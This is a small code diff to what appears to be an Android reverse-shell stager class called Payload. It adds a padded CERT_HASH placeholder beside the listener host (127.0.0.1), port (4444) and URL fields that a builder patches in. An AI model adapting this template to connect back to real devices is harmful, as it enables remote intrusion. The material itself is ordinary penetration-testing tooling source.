@@ -19,6 +19,7 @@ import dalvik.system.DexClassLoader;
 public class Payload {
 
     public static final String URL =            "ZZZZ                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ";
+    public static final String CERT_HASH =      "WWWW                                        ";
     public static final String LHOST =          "XXXX127.0.0.1                       ";
     public static final String LPORT =          "YYYY4444                            ";
     public static final String RETRY_TOTAL =    "TTTT                                ";
